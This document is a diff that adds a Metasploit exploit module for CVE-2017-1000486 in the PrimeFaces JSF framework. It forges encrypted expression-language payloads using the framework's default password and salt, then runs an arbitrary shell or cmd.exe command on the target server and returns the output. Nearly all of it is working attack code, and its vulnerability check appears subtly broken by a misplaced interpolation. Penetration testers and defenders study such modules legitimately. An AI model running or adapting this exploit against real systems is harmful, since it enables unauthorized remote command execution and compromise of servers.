@@ -1,0 +1,156 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::Remote::HttpClient
+  def initialize(info = {})
+    super(update_info(info,
+    'Name'           => 'CVE-2017-1000486 Primefaces Remote Code Execution Exploit',
+    'Description'    => %q{
+          This module exploits an expression language remote code execution flaw in the Primefaces JSF framework.
+          Primefaces versions prior to 5.2.21, 5.3.8 or 6.0 are vulnerable to a padding oracle attack, due to the use of weak crypto and default encryption password and salt.
+  },
+    'Author'         => [ 'Bjoern Schuette' ],
+    'License'        => MSF_LICENSE,
+    'References'     =>
+    [
+      ['CVE', 'CVE-2017-1000486'],
+      ['URL', 'http://blog.mindedsecurity.com/2016/02/rce-in-oracle-netbeans-opensource.html'],
+      ['URL', 'https://cryptosense.com/weak-encryption-flaw-in-primefaces/'],
+      ['URL', 'http://schuette.se/2018/01/16/in-your-primeface/']
+    ],
+    'Privileged'     => true,
+    'Payload'        =>
+    {
+      'Compat'      =>
+      {
+      'PayloadType' => 'cmd'
+      }
+
+    },
+    'DefaultOptions' =>
+    {
+      'WfsDelay' => 30
+    },
+    'DisclosureDate' => 'Feb 15 2016',
+    'Platform'       => ['unix', 'bsd', 'linux', 'osx', 'win'],
+    'Arch'           => ARCH_CMD,
+    'Targets'        => [
+      [
+      'Universal', {
+      'Platform'   => ['unix', 'bsd', 'linux', 'osx', 'win'],
+      'Arch'       => [ ARCH_CMD ],
+      },
+      ],
+    ],
+    'DefaultTarget' => 0))
+
+    register_options([
+      Opt::RPORT(80),
+      OptString.new('PASSWORD', [ true , "The password to login", 'primefaces']),
+      OptString.new('TARGETURI', [true, 'The base path to primefaces', '/javax.faces.resource/dynamiccontent.properties.xhtml'])  ,
+      OptString.new('CMD', [ false , "Command to execute", '']),
+    ])
+  end
+
+  def encrypt_el(password, payload)
+
+    salt = [0xa9, 0x9b, 0xc8, 0x32, 0x56, 0x34, 0xe3, 0x03].pack('c*')
+    iterationCount = 19
+
+    cipher = OpenSSL::Cipher.new("DES")
+    cipher.encrypt
+    cipher.pkcs5_keyivgen password, salt, iterationCount
+
+    ciphertext = cipher.update payload
+    ciphertext << cipher.final
+    return ciphertext
+
+  end
+
+  def http_send_command(cmd, payloadEL)
+    uri = normalize_uri(target_uri.path)
+    encrypted_payload = encrypt_el(datastore['PASSWORD'], payloadEL)
+    encrypted_payload_base64 = Rex::Text.encode_base64(encrypted_payload)
+    encrypted_payload_base64_url_encoded = Rex::Text.uri_encode(encrypted_payload_base64)
+
+    # send the payload and execute command
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri' => uri,
+      'vars_post' => {
+      'pfdrt' => 'sc',
+      'ln'  => 'primefaces',
+      'pfdrid' => encrypted_payload_base64_url_encoded
+      }
+    })
+
+    if res.nil?
+      vprint_error("Connection timed out")
+      fail_with(Failure::Unknown, "Failed to trigger the Enter button")
+    end
+
+    if res && res.headers && (res.code == 302 || res.code == 200)
+      print_good("HTTP return code #{res.code}")
+    else
+      vprint_error(res.body)
+      fail_with(Failure::Unknown, "#{peer} - Unknown error during execution")
+    end
+    return res
+  end
+
+  def exploit
+    cmd=""
+    if not datastore['CMD'].empty?
+      cmd = datastore['CMD']
+    else
+      cmd = payload.encoded
+    end
+    payloadEL = '${facesContext.getExternalContext().getResponse().setContentType("text/plain;charset=\"UTF-8\"")}'
+    payloadEL << '${session.setAttribute("scriptfactory","".getClass().forName("javax.script.ScriptEngineManager").newInstance())}'
+    payloadEL << '${session.setAttribute("scriptengine",session.getAttribute("scriptfactory").getEngineByName("JavaScript"))}'
+    payloadEL << '${session.getAttribute("scriptengine").getContext().setWriter(facesContext.getExternalContext().getResponse().getWriter())}'
+    payloadEL << '${session.getAttribute("scriptengine").eval('
+    payloadEL << '"var os = java.lang.System.getProperty(\"os.name\");'
+    payloadEL << 'var proc = null;'
+    payloadEL << 'os.toLowerCase().contains(\"win\")? '
+    payloadEL << 'proc = new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"cmd.exe\",\"/C\",\"%s\"]).start()' % cmd
+    payloadEL << ' : proc = new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"/bin/sh\",\"-c\",\"%s\"]).start();' % cmd
+    payloadEL << 'var is = proc.getInputStream();'
+    payloadEL << 'var sc = new java.util.Scanner(is,\"UTF-8\"); var out = \"\";'
+    payloadEL << 'while(sc.hasNext()) {out += sc.nextLine()+String.fromCharCode(10);}print(out);")}'
+    payloadEL << '${facesContext.getExternalContext().getResponse().getWriter().flush()}'
+    payloadEL << '${facesContext.getExternalContext().getResponse().getWriter().close()}';
+
+    vprint_status("Attempting to execute: #{cmd}")
+    resp = http_send_command(cmd, payloadEL)
+    print_line(resp.body.to_s)
+    m = resp.body.to_s 
+    if m.empty?
+      print_error("This server may not be vulnerable")
+    end
+    return
+  end
+
+  def check
+    var_a = rand_text_alpha_lower(4)
+    payloadEL = "${facesContext.getExternalContext().setResponseHeader(\"primesecretchk\", %s" % var_a
+    res = http_send_command(var_a, payloadEL)
+    if res.headers
+      if res.headers["primesecretchk"] == #{var_a}
+        vprint_good("Victim evaluates EL expressions")
+        return Exploit::CheckCode::Vulnerable
+      end
+    else
+      vprint_error("Unable to determine due to a HTTP connection timeout")
+      return Exploit::CheckCode::Unknown
+    end
+    return Exploit::CheckCode::Safe
+  end
+
+end
